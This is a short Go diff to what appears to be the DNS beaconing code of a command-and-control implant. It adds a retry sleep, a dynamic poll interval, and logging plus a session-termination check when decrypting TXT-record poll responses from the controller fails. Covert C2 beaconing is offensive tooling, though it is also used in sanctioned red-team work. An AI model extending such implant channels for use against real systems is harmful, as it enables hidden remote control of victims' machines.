@@ -133,6 +133,8 @@ func dnsLookup(domain string) (string, error) {
 		} else {
 			break
 		}
+		//Sleep for a second before retry
+		time.Sleep(time.Second)
 	}
 	if err != nil || len(txts) == 0 {
 		return "", err
@@ -355,7 +357,7 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 		select {
 		case <-ctrl:
 			return
-		case <-time.After(pollInterval):
+		case <-time.After(GetPollInterval()):
 			nonce := dnsNonce(nonceStdSize)
 			domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, sessionID, sessionPollingMsg, parentDomain)
 			txt, err := dnsLookup(domain)
@@ -384,9 +386,14 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			}
 			pollData, err := GCMDecrypt(sessionKey, rawTxt)
 			if err != nil {
+				strTxt := string(rawTxt[:])
 				// {{if .Config.Debug}}
 				log.Printf("Failed to decrypt poll response")
+				log.Printf("TXT: %s", strTxt)
 				// {{end}}
+				if strTxt == sessionID {
+					return
+				}
 				break
 			}
 			dnsPoll := &pb.DNSPoll{}
